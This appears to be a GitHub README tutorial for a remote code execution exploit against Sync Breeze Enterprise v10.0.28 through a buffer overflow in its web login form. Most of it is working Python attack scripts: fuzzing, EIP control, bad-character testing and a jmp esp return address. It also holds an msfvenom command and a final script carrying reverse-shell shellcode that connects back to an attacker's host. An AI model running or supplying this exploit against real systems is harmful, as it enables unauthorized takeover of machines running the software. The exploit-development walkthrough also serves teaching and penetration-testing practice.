# Sync Breeze Enterprise v10.0.28 RCE

SyncBreeze is a fast, powerful and reliable file synchronization solution for local disks, network shares, NAS storage devices and enterprise storage systems. Users are provided with multiple one-way and two-way file synchronization modes, periodic file synchronization, real-time file synchronization, bit-level file synchronization, multi-stream file synchronization, background file synchronization and much more. However, on version v10.0.28, the application is vulnerable to a buffer overflow in the login page for both username and password fields, allowing us to execute commands remotely and gain access to the machine running it.

First, for the exploit to work the web server on Sync Breeze needs to be enabled. This can be done be opening the Sync Breeze Client application and going to: Tools > Advanced Options > Server > Check the option 'Enable Web Server on Port'. By default the application runs on port 80. While analyzing it we can see that the server contains a login page, you can access it on the URL: http://"serverip"/login, where "serverip" is the IP Address of the machine running Sync Breeze. On the login page we can see that it has two fields, the username and password, when trying to manually pass arguments initially, we can see that both username and password fields have a length limit. If we inspect the page code we can see that both fields have a limit of 64, editing it to remove the limit, we can bypass and enter how many values we want.

![image](https://github.com/Smarttfoxx/syncbreezeentrce/assets/140526026/22c51652-3db2-4936-ae70-98eb7a5dd24f)
![image](https://github.com/Smarttfoxx/syncbreezeentrce/assets/140526026/15f9e7ad-bb96-46f4-adb6-c2fdad132055)

To check how many bytes are necessary to cause the bufferoverflow or if the application is vulnerable to it, we can create a Python2 script to make POST requests to the login page, we can set a maximum of 5000 bytes to the final request, so, going from 1 byte on the first request to 5000 bytes on the final on a loop, adding 1 each time and with a delay of 0.05 seconds between each request to give time to the server to process them and retrieve us a more exact value. Running the script we find values 780 and 781 as the last two before the crash. Testing again sending only 780 first we can already see that the buffer overflow occurs and the application crashes.

```
#!/usr/bin/python
import socket
import time

counter = 0

while counter <= 5000:
    
    counter +=1
    bufferOvrCode = "A" * counter
    requestLenght = len(bufferOvrCode) + 23

    print ("Fuzzing with %s bytes"%len(bufferOvrCode))

    request="POST /login HTTP/1.1\r\n"
    request+="Host: 192.168.0.12\r\n"
    request+="Content-Length: "+str(requestLenght)+"\r\n"
    request+="Cache-Control: max-age=0\r\n"
    request+="Upgrade-Insecure-Requests: 1\r\n"
    request+="Origin: http://192.168.0.12\r\n"
    request+="Content-Type: application/x-www-form-urlencoded\r\n"
    request+="User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36\r\n"
    request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
    request+="Referer: http://192.168.0.12/login\r\n"
    request+="Accept-Encoding: gzip, deflate, br\r\n"
    request+="Accept-Language: en-US,en;q=0.9\r\n"
    request+="Connection: close\r\n"
    request+="\r\n"
    request+="username="+bufferOvrCode+"&password=1234"

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.0.12",80))
    s.send(request)
    s.recv(1024)
    time.sleep(0.05)
```

Since we found how many bytes are necessary to cause the bufferoverflow, we can now send it plus 4 more bytes, let's send the character "B" 4 times.

```
#!/usr/bin/python
import socket

bufferOvrCode = "A" * 780 + "B" * 4
requestLenght = len(bufferOvrCode) + 23

request="POST /login HTTP/1.1\r\n"
request+="Host: 192.168.0.12\r\n"
request+="Content-Length: "+str(requestLenght)+"\r\n"
request+="Cache-Control: max-age=0\r\n"
request+="Upgrade-Insecure-Requests: 1\r\n"
request+="Origin: http://192.168.0.12\r\n"
request+="Content-Type: application/x-www-form-urlencoded\r\n"
request+="User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36\r\n"
request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
request+="Referer: http://192.168.0.12/login\r\n"
request+="Accept-Encoding: gzip, deflate, br\r\n"
request+="Accept-Language: en-US,en;q=0.9\r\n"
request+="Connection: close\r\n"
request+="\r\n"
request+="username="+bufferOvrCode+"&password=1234"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.12",80))
s.send(request)
```

If we analyze the application during the bufferoverflow on a debugger like x32dbg we can see that sending  "A" * 780 + "B" * 4 (this means A 780 times and B 4 times) will give us access to the register EIP. In the image below we can see the values "42424242" in register EIP, this is "B" 4 times like we sent in our script.

![image](https://github.com/Smarttfoxx/syncbreezeentrce/assets/140526026/7b6bc791-9422-43c1-ba7e-8020e84250ab)

We can now check for bad characters, or in other words, which characters in hexadecimal are not allowed by the application, this is important to generate our shellcode. To send them we can use the same python script used for the fuzzing but without the loop since we already know how to cause the bufferoverflow, we will send on the username field the 780 bytes + 4 bytes + a list of hexadecimal characters going from \x00 to \xff. We will send them and analyze the response on x32dgb, every character that doesn't appear is considered a bad character and we need to make notes on them.

```
\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

Now that we have our list of bad characters, we need to find a good return address, this will serve to access register ESP, execute our shellcode there and not break the program execution flow. First make sure that the SyncBreeze service is running, close x32dbg and open it again and attach the Sync Breeze service. While in x32dgb, right click on the disassembler > Search for > All user modules > command > Search for "jmp esp". This will search for all symbols in the program or associated to it that use the command "jmp esp" in assembly. Our goal here is to use symbols that have at least none type of protections, so, Windows DLLS are out of escope here (reason we chose "User Modules"). For x32db we can use the "checksec" plugin to search for the security type on the symbols. Running it we can see that all the three DLLs from Sync Breeze have no protection.

![image](https://github.com/Smarttfoxx/syncbreezeentrce/assets/140526026/b619813b-6bc9-428c-827c-4a72f6453985)

Searching for "jmp esp" we can see that "libpal.dll" has it and is also an unsecure dll. The command "jmp esp" on it is located at address 0x100931AF.

![image](https://github.com/Smarttfoxx/syncbreezeentrce/assets/140526026/ce068ea3-e7b3-4d4f-aeb2-7b62cdf240ac)

To test our return address and also how much space we have for our shellcode, we can now edit our Python script and add its address after "A" * 780 instead of "B" * 4, also, we can add "C" * 400 to see how much space available we have. A Shellcode from MSFVenom takes normally 350-370 bytes. Note that the address we found is: 10 09 31 AF, however, since the application is 32-bits, we need to add the address in reverse to python script due to little-endian. It would be: "\xaf\x31\x09\x10" instead of "\x10\x09\x31\xaf".

```
#!/usr/bin/python
import socket

# bad chars = \x00\x0a\x0d\x25\x26\x2b\x3d
# return addres = "\xaf\x31\x09\x10"

bufferOvrCode = "A" * 780 + "\xaf\x31\x09\x10" + "C" * 400

requestLenght = len(bufferOvrCode) + 23

request="POST /login HTTP/1.1\r\n"
request+="Host: 192.168.0.12\r\n"
request+="Content-Length: "+str(requestLenght)+"\r\n"
request+="Cache-Control: max-age=0\r\n"
request+="Upgrade-Insecure-Requests: 1\r\n"
request+="Origin: http://192.168.0.12\r\n"
request+="Content-Type: application/x-www-form-urlencoded\r\n"
request+="User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36\r\n"
request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
request+="Referer: http://192.168.0.12/login\r\n"
request+="Accept-Encoding: gzip, deflate, br\r\n"
request+="Accept-Language: en-US,en;q=0.9\r\n"
request+="Connection: close\r\n"
request+="\r\n"
request+="username="+bufferOvrCode+"&password=1234"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.12",80))
s.send(request)
```

Running the script we can check on x32dbg the results, we have enough space for our shellcode. Now, it's time to generate it. We can use the command: 

```
msfvenom -p windows/shell_reverse_tcp lhost=you_ip lport=443 exitfunc=thread -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f python
```
Now, we only need to add it to our Python script and then run it against our target machine. The final exploit code should look like this:

```
#!/usr/bin/python
import socket

# bad chars = \x00\x0a\x0d\x25\x26\x2b\x3d
# return addres = "\xaf\x31\x09\x10"

shellCode = ("\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\x30\xa9\x9b\xf1\x83\xee\xfc\xe2\xf4\xcc\x41\x19\xf1"
"\x30\xa9\xfb\x78\xd5\x98\x5b\x95\xbb\xf9\xab\x7a\x62\xa5"
"\x10\xa3\x24\x22\xe9\xd9\x3f\x1e\xd1\xd7\x01\x56\x37\xcd"
"\x51\xd5\x99\xdd\x10\x68\x54\xfc\x31\x6e\x79\x03\x62\xfe"
"\x10\xa3\x20\x22\xd1\xcd\xbb\xe5\x8a\x89\xd3\xe1\x9a\x20"
"\x61\x22\xc2\xd1\x31\x7a\x10\xb8\x28\x4a\xa1\xb8\xbb\x9d"
"\x10\xf0\xe6\x98\x64\x5d\xf1\x66\x96\xf0\xf7\x91\x7b\x84"
"\xc6\xaa\xe6\x09\x0b\xd4\xbf\x84\xd4\xf1\x10\xa9\x14\xa8"
"\x48\x97\xbb\xa5\xd0\x7a\x68\xb5\x9a\x22\xbb\xad\x10\xf0"
"\xe0\x20\xdf\xd5\x14\xf2\xc0\x90\x69\xf3\xca\x0e\xd0\xf6"
"\xc4\xab\xbb\xbb\x70\x7c\x6d\xc1\xa8\xc3\x30\xa9\xf3\x86"
"\x43\x9b\xc4\xa5\x58\xe5\xec\xd7\x37\x56\x4e\x49\xa0\xa8"
"\x9b\xf1\x19\x6d\xcf\xa1\x58\x80\x1b\x9a\x30\x56\x4e\xa1"
"\x60\xf9\xcb\xb1\x60\xe9\xcb\x99\xda\xa6\x44\x11\xcf\x7c"
"\x0c\x9b\x35\xc1\x5b\x59\x30\xa2\xf3\xf3\x30\xa8\x20\x78"
"\xd6\xc3\x8b\xa7\x67\xc1\x02\x54\x44\xc8\x64\x24\xb5\x69"
"\xef\xfd\xcf\xe7\x93\x84\xdc\xc1\x6b\x44\x92\xff\x64\x24"
"\x58\xca\xf6\x95\x30\x20\x78\xa6\x67\xfe\xaa\x07\x5a\xbb"
"\xc2\xa7\xd2\x54\xfd\x36\x74\x8d\xa7\xf0\x31\x24\xdf\xd5"
"\x20\x6f\x9b\xb5\x64\xf9\xcd\xa7\x66\xef\xcd\xbf\x66\xff"
"\xc8\xa7\x58\xd0\x57\xce\xb6\x56\x4e\x78\xd0\xe7\xcd\xb7"
"\xcf\x99\xf3\xf9\xb7\xb4\xfb\x0e\xe5\x12\x7b\xec\x1a\xa3"
"\xf3\x57\xa5\x14\x06\x0e\xe5\x95\x9d\x8d\x3a\x29\x60\x11"
"\x45\xac\x20\xb6\x23\xdb\xf4\x9b\x30\xfa\x64\x24")

bufferOvrCode = "A" * 780 + "\xaf\x31\x09\x10" + "\x90" * 8 + shellCode

requestLenght = len(bufferOvrCode) + 23

request="POST /login HTTP/1.1\r\n"
request+="Host: 192.168.0.12\r\n"
request+="Content-Length: "+str(requestLenght)+"\r\n"
request+="Cache-Control: max-age=0\r\n"
request+="Upgrade-Insecure-Requests: 1\r\n"
request+="Origin: http://192.168.0.12\r\n"
request+="Content-Type: application/x-www-form-urlencoded\r\n"
request+="User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36\r\n"
request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
request+="Referer: http://192.168.0.12/login\r\n"
request+="Accept-Encoding: gzip, deflate, br\r\n"
request+="Accept-Language: en-US,en;q=0.9\r\n"
request+="Connection: close\r\n"
request+="\r\n"
request+="username="+bufferOvrCode+"&password=1234"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.12",80))
s.send(request)
```

## Legal disclaimer:
Don't use this exploit against a target without permission. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse of this tool. Use only for educational and research purposes.
